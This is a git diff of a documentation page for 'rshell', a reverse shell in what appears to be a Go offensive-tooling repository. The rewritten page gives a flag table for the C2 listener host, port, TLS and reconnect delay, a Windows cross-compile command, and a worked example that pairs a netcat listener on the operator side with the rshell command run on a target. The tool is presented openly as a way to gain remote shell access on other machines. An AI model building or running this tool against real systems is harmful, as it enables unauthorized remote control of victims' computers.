@@ -1,13 +1,22 @@
 # `rshell`
 
-Source: [`cmd/rshell/`](https://github.com/oioio-space/maldev/tree/master/cmd/rshell) ·
-godoc: [pkg.go.dev/github.com/oioio-space/maldev/cmd/rshell](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/rshell)
+> Minimal reverse shell over `c2/shell` + `c2/transport`.
 
-## What it does
+**Source:** [`cmd/rshell/`](https://github.com/oioio-space/maldev/tree/master/cmd/rshell) · **godoc:** [pkg.go.dev/…/cmd/rshell](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/rshell)
+**Audience:** operator · **Platforms:** Windows + Linux
 
-rshell is a minimal reverse shell using c2/shell and c2/transport.
-Usage:
-	rshell -host 10.0.0.1 -port 4444 [-tls] [-retry 0]
+## Synopsis
+
+```text
+rshell -host <ip> -port <port> [-tls] [-retry <seconds>]
+```
+
+| Flag | Default | Meaning |
+|---|---|---|
+| `-host` | — | C2 listener host. |
+| `-port` | — | C2 listener port. |
+| `-tls` | off | Wrap the transport in TLS (uses `c2/cert` if no cert provided). |
+| `-retry` | `0` | Reconnect delay in seconds (0 = no retry). |
 
 ## Build
 
@@ -15,17 +24,16 @@ Usage:
 GOOS=windows GOARCH=amd64 go build -o rshell.exe ./cmd/rshell
 ```
 
-For platform-native builds, drop the `GOOS` / `GOARCH` prefix.
-
-## Help / flags
-
-Run with `-h` to see the current flag set:
+## Example
 
 ```bash
-./rshell -h
+# On the operator side, any TCP listener (nc / metasploit / c2/transport server)
+nc -lvnp 4444
+
+# On target:
+rshell.exe -host 10.0.0.5 -port 4444 -tls -retry 30
 ```
 
-## Related
+## See also
 
-- Reference for the underlying packages: see the [Techniques tree](../techniques/).
-- Runnable examples: see [Runnable examples](../examples/runnable.md).
+- Techniques: [`c2/transport`](../techniques/c2/transport.md), [`c2/shell`](../techniques/c2/reverse-shell.md).
